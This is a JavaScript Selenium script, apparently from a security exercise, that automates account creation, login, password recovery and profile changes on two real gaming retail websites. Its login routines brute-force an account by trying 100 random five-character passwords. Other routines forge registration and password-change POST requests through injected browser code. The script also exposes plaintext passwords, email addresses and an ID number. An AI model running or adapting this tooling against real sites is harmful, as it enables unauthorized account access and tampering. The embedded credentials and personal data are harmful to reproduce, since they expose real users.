const {Builder, By} = require('selenium-webdriver');
var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;

var user = "farata@musiccode.me";

//utils
const sleep = (seconds) => { return new Promise(resolve => setTimeout(resolve, seconds * 1000)) }

const randomGenerate = (length) => {
	var numbers = '0123456789';
	var letters_minus = 'abcdefghijklmnopqrstuvwxyz';
	var letters_mayus = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
	var specials = '_@#$%.';
	var chars = numbers + letters_minus;// + specials;
	var result = "";


	while (length > 0) {
		length--;
		result += chars[Math.floor(Math.random() * chars.length)];
	}

	return result
}

//https://www.newgame.cl/
/*
const create = async (url) => {
    let driver = await new Builder().forBrowser('chrome').build();
    await driver.get(url);
    await sleep(10);
    
    js = "var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://www.newgame.cl/index.php', false); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send('rut=11111111-1&nombre=a&apellido1=a&apellido2=a&sexo=m&email=christian.munoz1@mail.udp.cl&emailRe=christian.munoz1@mail.udp.cl&pass=a&passRe=a&region=13&ciudad=44&comuna=292&direccion=a+123&postal=123&telefonos=123&accion=guardarform'); return xhr.response;";
    
    console.log(await driver.executeScript(js));
}

const login = async (url) => {
    let driver = await new Builder().forBrowser('chrome').build();
    var pass, i;

    for (i = 0; i < 100; i++) {
        pass = randomGenerate(5);

        await driver.get(url + "?user=" + user + "&pass=" + pass);
        await sleep(1);
        
        console.log("N° "+ (i+1).toString() +" login " + pass + " ? -> " + await driver.findElement(By.css("body")).getText());
        await sleep(1);
    }

    await driver.get(url + "?user=" + user + "&pass=" + "e1371");
    await sleep(1);
        
    console.log("N° "+ (i+1).toString() +" login " + "e1371" + " ? -> " + await driver.findElement(By.css("body")).getText());
    await sleep(1);
}

const forgot = async (url) => {
    let driver = await new Builder().forBrowser('chrome').build();
    
    await driver.get(url + "?value=" + user);
    await sleep(5);
}

const modify = async (url) => {
    let driver = await new Builder().forBrowser('chrome').build();
    await driver.get("https://www.newgame.cl/validapass.php" + "?user=" + user + "&pass=" + "e1371");
    await sleep(3);
    await driver.get(url);
    await sleep(10);
    js = "var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://www.newgame.cl/index.php', false); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send('rut=18043866-1&nombre=a&apellido1=a&apellido2=a&sexo=m&email=farata%40musiccode.me&emailRe=farata%40musiccode.me&pass=e1371&passRe=e1371&region=1&ciudad=1&comuna=1&direccion=a+123&postal=123&telefonos=9&prefpsvita=checked&preftablet=checked&accion=updateform'); return xhr.response;";

    await driver.executeScript(js);
}
*/

//https://www.vsgamers.es
/*
const create = async (url) => {
    let driver = await new Builder().forBrowser('chrome').build();
    await driver.get("https://www.vsgamers.es/access/registration");
    await sleep(10);
    
    js = "var xhr = new XMLHttpRequest(); xhr.open('POST', '" + url + "', false); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send('email=asd@gmail.com&username=aaaa1&password=aaaaaaa&privacyAccepted=1'); return xhr.response;";
    
    console.log(await driver.executeScript(js));
}

const login = async (url) => {
    let driver = await new Builder().forBrowser('chrome').build();
    var pass, i;

    for (i = 0; i < 100; i++) {
        pass = randomGenerate(5);

        await driver.get("https://www.vsgamers.es/access/login");
        await sleep(10);

        js = "var xhr = new XMLHttpRequest(); xhr.open('POST', '" + url + "', false); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send('_username=farata%40musiccode.me&_password=" + pass + "'); return xhr.response;";

        console.log("N° "+ (i+1).toString() +" login " + pass + " ? -> " + await driver.executeScript(js));
    }

    await driver.get("https://www.vsgamers.es/access/login");
}

const forgot = async (url) => {
    let driver = await new Builder().forBrowser('chrome').build();
    let input;
    await driver.get("https://www.vsgamers.es/access/password-recovery");
    await sleep(10);
    
    input = driver.findElement(By.id("frm_password_recovery_email"));
    input.clear();
    input.sendKeys("farata@musiccode.me");
    await sleep(3);

    console.log(await driver.executeScript('$("vs-access-password-recovery form button").click();'));
}

const modify = async (url) => {
    let driver = await new Builder().forBrowser('chrome').build();
    
    await driver.get("https://www.vsgamers.es/access/login");
    await sleep(10);

    js = "var xhr = new XMLHttpRequest(); xhr.open('POST', '" + "https://www.vsgamers.es/login/check" + "', false); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send('_username=farata%40musiccode.me&_password=" + "kHg2Jq6NKsDYOme" + "'); return xhr.response;";
    console.log("login " + "kHg2Jq6NKsDYOme" + " ? -> " + await driver.executeScript(js));

    await driver.get("https://www.vsgamers.es/profile");
    await sleep(10);

    js = "var xhr = new XMLHttpRequest(); xhr.open('POST', '" + url + "', false); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send('value=a'); return xhr.response;";

    await driver.executeScript(js);
}
*/

//https://www.newgame.cl/

//create("https://www.newgame.cl/index.php");
//login("https://www.newgame.cl/validapass.php");
//forgot("https://www.newgame.cl/recuperapassword.php");
//modify("https://www.newgame.cl/index.php");

//https://www.vsgamers.es

//create("https://www.vsgamers.es/registration");
//login("https://www.vsgamers.es/login/check");
//forgot("https://www.vsgamers.es/password-recovery");
//modify("https://www.vsgamers.es/profile/change-password");